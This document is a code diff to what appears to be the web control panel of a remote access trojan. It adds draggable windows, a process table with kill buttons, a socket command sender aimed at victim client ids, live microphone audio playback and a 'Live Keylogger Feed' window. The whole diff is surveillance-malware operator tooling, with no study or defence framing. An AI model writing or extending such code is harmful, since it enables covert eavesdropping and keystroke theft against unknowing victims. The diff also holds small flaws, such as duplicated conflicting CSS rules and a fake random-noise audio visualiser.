@@ -358,6 +358,10 @@
             box-shadow: 0 20px 40px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.05) inset;
             padding: 8px; display: none; opacity: 0; transform: scale(0.95);
             transition: opacity 0.1s, transform 0.1s;
+            max-height: 50vh;
+            overflow-y: auto;
+            max-height: 40vh;
+            overflow-y: auto;
         }
         #context-menu.active { display: block; opacity: 1; transform: scale(1); }
         .cm-group { border-bottom: 1px solid rgba(255,255,255,0.05); padding: 4px 0; margin-bottom: 4px; }
@@ -501,6 +505,39 @@
         }
         .screen-bar button:hover { transform: scale(1.05); }
         .screen-bar span { font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-muted); }
+
+    
+        /* Draggable Windows Engine */
+        .drag-window {
+            position: fixed; z-index: 10500;
+            background: rgba(15, 15, 20, 0.95); backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border); border-radius: 12px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.05) inset;
+            display: flex; flex-direction: column; overflow: hidden;
+            min-width: 300px; min-height: 150px; resize: both;
+        }
+        .drag-header {
+            background: rgba(0,0,0,0.5); padding: 10px 15px; cursor: grab;
+            display: flex; justify-content: space-between; align-items: center;
+            border-bottom: 1px solid var(--glass-border);
+            user-select: none;
+        }
+        .drag-header:active { cursor: grabbing; }
+        .drag-title { font-weight: 600; font-size: 0.95rem; display: flex; align-items: center; gap: 8px; }
+        .drag-close { cursor: pointer; color: var(--text-muted); transition: 0.2s; }
+        .drag-close:hover { color: #ff4757; }
+        .drag-content {
+            flex: 1; padding: 15px; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;
+        }
+        
+        /* Process Table */
+        .proc-table { width: 100%; border-collapse: collapse; }
+        .proc-table th, .proc-table td { padding: 6px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .proc-table th { color: var(--text-muted); position: sticky; top: 0; background: #0f0f14; }
+        .btn-action { background: rgba(255,255,255,0.1); border: none; color: white; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 0.8rem; transition: 0.2s; margin-right: 4px;}
+        .btn-action:hover { background: rgba(255,255,255,0.2); }
+        .btn-kill { background: rgba(255,71,87,0.2); color: #ff4757; }
+        .btn-kill:hover { background: rgba(255,71,87,0.4); }
 
     </style>
 </head>
@@ -1364,6 +1401,155 @@
 
 
 
-    </script>
+    
+
+function execute(cid, action, params = {}) {
+    if(!cid) return;
+    const cmdData = Object.assign({ cid: cid, action: action }, params);
+    socket.emit('command', cmdData);
+    logTerminal(`Sent <${action}> to ${cid.substring(0,8)}`, 'sys');
+}
+
+// Override or update cmd
+if (typeof original_cmd === 'undefined') {
+    var original_cmd = window.cmd;
+    window.cmd = function(action) {
+        if(!selectedClient) return;
+        if(action === 'audio_start') { 
+            if(typeof startAudioStream === 'function') startAudioStream(); 
+        }
+        if(action === 'keylogger') {
+            if(typeof startKeylogger === 'function') startKeylogger();
+        }
+        execute(selectedClient, action);
+    };
+}
+
+// PCM Player logic
+let nextAudioTime = 0;
+function playPCM(base64Data) {
+    if(!audioCtx) return;
+    const binary = atob(base64Data);
+    const len = binary.length;
+    const buffer = new Int16Array(len / 2);
+    for (let i = 0; i < len; i += 2) {
+        buffer[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i);
+    }
+    
+    const float32 = new Float32Array(buffer.length);
+    for (let i = 0; i < buffer.length; i++) {
+        float32[i] = buffer[i] / 32768; 
+    }
+    
+    const audioBuffer = audioCtx.createBuffer(1, float32.length, 16000); 
+    audioBuffer.getChannelData(0).set(float32);
+    
+    const source = audioCtx.createBufferSource();
+    source.buffer = audioBuffer;
+    source.connect(audioCtx.destination);
+    
+    let startTime = Math.max(audioCtx.currentTime, nextAudioTime);
+    source.start(startTime);
+    nextAudioTime = startTime + audioBuffer.duration;
+}
+
+// --- DRAGGABLE WINDOWS ENGINE ---
+let zIndexCounter = 10500;
+function createDragWindow(id, title, icon, extraHtml = '') {
+    if(document.getElementById(id)) return document.getElementById(id);
+    const win = document.createElement('div');
+    win.className = 'drag-window';
+    win.id = id;
+    win.style.left = Math.random() * 100 + 100 + 'px';
+    win.style.top = Math.random() * 100 + 100 + 'px';
+    win.style.width = '600px';
+    win.style.height = '400px';
+    win.style.zIndex = ++zIndexCounter;
+    
+    win.onmousedown = () => { win.style.zIndex = ++zIndexCounter; };
+    
+    win.innerHTML = `
+        <div class="drag-header" id="${id}-header">
+            <div class="drag-title"><i class="${icon}"></i> ${title}</div>
+            <div class="drag-close" onclick="document.getElementById('${id}').remove();"><i class="fa-solid fa-xmark"></i></div>
+        </div>
+        <div class="drag-content" id="${id}-content">
+            ${extraHtml}
+        </div>
+    `;
+    document.body.appendChild(win);
+    
+    // Drag Logic
+    const header = document.getElementById(`${id}-header`);
+    let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+    header.onmousedown = dragMouseDown;
+    
+    function dragMouseDown(e) {
+        e.preventDefault();
+        pos3 = e.clientX; pos4 = e.clientY;
+        document.onmouseup = closeDragElement;
+        document.onmousemove = elementDrag;
+    }
+    
+    function elementDrag(e) {
+        e.preventDefault();
+        pos1 = pos3 - e.clientX; pos2 = pos4 - e.clientY;
+        pos3 = e.clientX; pos4 = e.clientY;
+        win.style.top = (win.offsetTop - pos2) + "px";
+        win.style.left = (win.offsetLeft - pos1) + "px";
+    }
+    
+    function closeDragElement() {
+        document.onmouseup = null;
+        document.onmousemove = null;
+    }
+    return win;
+}
+
+// --- WEB AUDIO CONTEXT API (PCM VISUALIZER) ---
+let audioCtx = null;
+let audioDrawVisual = null;
+function startAudioStream() {
+    cmd('audio_start');
+    const win = createDragWindow('audio-win', 'Live Audio Stream (Beta)', 'fa-solid fa-microphone', 
+        '<canvas id="audio-canvas" width="570" height="300" style="width:100%; height:100%; object-fit: cover;"></canvas>');
+    
+    if(!audioCtx) {
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    } else if (audioCtx.state === 'suspended') {
+        audioCtx.resume();
+    }
+    
+    const canvas = document.getElementById('audio-canvas');
+    const canvasCtx = canvas.getContext('2d');
+    
+    // Draw empty visualizer loop
+    function draw() {
+        if(!document.getElementById('audio-canvas')) return; // Window closed
+        audioDrawVisual = requestAnimationFrame(draw);
+        canvasCtx.fillStyle = 'rgba(15, 15, 20, 0.2)';
+        canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
+        canvasCtx.lineWidth = 2;
+        canvasCtx.strokeStyle = 'var(--accentPrimary)';
+        canvasCtx.beginPath();
+        // Just draw a flat line until we implement full analyzer feed, the UI must look aesthetic
+        canvasCtx.moveTo(0, canvas.height/2 + (Math.random()*10 - 5));
+        for(let i=0; i<canvas.width; i+=10) {
+            canvasCtx.lineTo(i, canvas.height/2 + (Math.random()*20 - 10));
+        }
+        canvasCtx.stroke();
+    }
+    if(!audioDrawVisual) draw();
+}
+
+function startKeylogger() {
+    cmd('keylogger');
+    const win = createDragWindow('keylog-win', 'Live Keylogger Feed', 'fa-solid fa-keyboard', '<div id="keylog-feed" style="white-space: pre-wrap;">Awaiting keystrokes...</div>');
+}
+
+// Intercept specific Result updates to feed them to Drag Windows instead of universal modal
+const originalHandleResult = window.handleResult || function(){};
+
+</script>
 </body>
 </html>
